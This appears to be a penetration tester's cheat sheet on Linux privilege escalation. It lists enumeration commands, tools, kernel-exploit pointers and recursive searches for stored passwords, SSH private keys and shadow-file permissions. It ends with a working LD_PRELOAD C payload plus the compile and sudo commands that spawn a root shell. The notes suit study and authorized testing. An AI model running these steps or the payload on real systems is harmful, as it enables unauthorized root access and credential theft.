# 1. System Enumeration 

## Command 

1. hostname 
2. uname -a 
3. cat /etc/issue
4. cat /proc/version
5. lscpu 
6. ps aux | grep root 
7. ps aux | grep username 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 2. User Enumeration
 
## Command 

1. whoami 
2. id 
3. sudo -l 
4. cat /etc/passwd
5. cat /etc/passwd | cut -d : -f 1 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 3. Network Enumeration

## Command 

1. ifconfig 
2. ip a 
3. ip route || route 
4. arp -a 
5. ip neigh 
4. netstat -ano 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 4. Exploring Automated Tools

#tools name 

1. linpeas
2. linEnum
3. linux-exploit-suggester
4. linixprivchecker.py

# 5. Kernel Exploits

## what is a kernel ?

   * A computer program that control everthing in the system 
   * Facikitates interactions between hardware & software components 
   * A translator
    
## Resource 

* github - https://github.com/lucyoa/kernel-exploits


# 5.1 Escalation via Kernel Exploit
    
# manual 

1. uname -a 
2. copy karnel version & search exploit in Google 

# Automation 

1. linux-exploit-suggester
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 6. Escalation Path - Passwords & File Permissions

# 6.1 Escalation via Stored Passwords

# Command :

* history 
* cat bash_history 

# Automation 

* grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
* find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;



# 6.2 Escalation via Weak File Permissions

* ls -la /etc/passwd
* ls -la /etc/shadow
# not vuln

┌(^.^)-(zapstiko@parrot)-(~)
└─»(★)ls -la /etc/passwd
-rw-r--r-- 1 root root 2.8K Dec 10 00:12 /etc/passwd

┌(^.^)-(zapstiko@parrot)-(~)
└─»(★)ls -la /etc/shadow
-rw-r----- 1 root shadow 1.5K Dec  9 20:45 /etc/shadow

# vuln 
┌(^.^)-(zapstiko@parrot)-(~)
└─»(★)ls -la /etc/passwd
-rw-r--r-- 1 root root 2.8K Dec 10 00:12 /etc/passwd

┌(^.^)-(zapstiko@parrot)-(~)
└─»(★)ls -la /etc/shadow
# -rw-rw-r-- 1 root shadow 1.5K Dec  9 20:45 /etc/shadow


# 6.3 Escalation via SSH Keys

# Find Command 

* find / -name authorized_keys 2> /dev/null
* find / -name id_rsa 2> /dev/null
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 7. Escalation Path - Sudo

# checking command 

* sudo -l 
# LD_PRELOAD

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

* gcc -fPIC -shared -o shell.so shell.c -nostartfiles
* sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

** GTFObin
























